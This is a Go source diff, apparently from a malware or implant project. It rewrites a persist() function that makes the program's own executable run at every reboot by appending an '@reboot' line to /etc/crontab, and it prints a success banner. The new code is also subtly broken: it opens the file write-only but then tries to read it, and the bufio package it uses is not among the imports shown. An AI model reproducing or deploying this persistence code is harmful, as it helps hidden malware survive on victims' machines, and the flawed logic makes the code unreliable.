@@ -6,7 +6,6 @@ import (
 	"net"
 	"net/http"
 	"os"
-	"os/exec"
 	"strings"
 	"time"
 )
@@ -44,16 +43,22 @@ func is_persistent() bool {
 func persist() {
 	// achieve persistence by creating a cronjob
 
-	cmd := exec.Command("crontab", "-e")
-	cmd.Run()
-	f, _ := os.OpenFile("/tmp/crontab", os.O_APPEND|os.O_WRONLY, 0644)
 	file_path, _ := os.Executable()
 	line := fmt.Sprintf("@reboot %s", file_path)
-	fmt.Fprintln(f, line)
-	cmd = exec.Command("crontab", "/tmp/crontab")
-	cmd.Run()
-	os.Remove("/tmp/crontab")
+	file, _ := os.OpenFile("/etc/crontab", os.O_WRONLY|os.O_APPEND, 0644)
+	scanner := bufio.NewScanner(file)
+	var content string
+	for scanner.Scan() {
+		content += scanner.Text() + "\n"
+	}
 
+	content += line + "\n"
+	_, err := file.Write([]byte(content))
+	if err != nil {
+		fmt.Println(err.Error())
+	} else {
+		fmt.Println("[*] Persisted successfully")
+	}
 }
 
 func has_internet_access() bool {
